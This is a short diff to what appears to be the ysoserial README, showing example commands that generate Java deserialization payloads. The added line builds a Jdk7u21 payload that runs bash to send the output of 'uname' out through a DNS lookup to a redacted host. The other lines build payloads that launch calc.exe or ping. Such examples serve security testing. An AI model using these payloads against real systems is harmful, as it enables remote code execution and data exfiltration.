@@ -6,6 +6,7 @@
 java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
 java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
 java -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' > payload.bin
+java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
 ```
 
 payload | author | dependencies | impact (if not RCE)
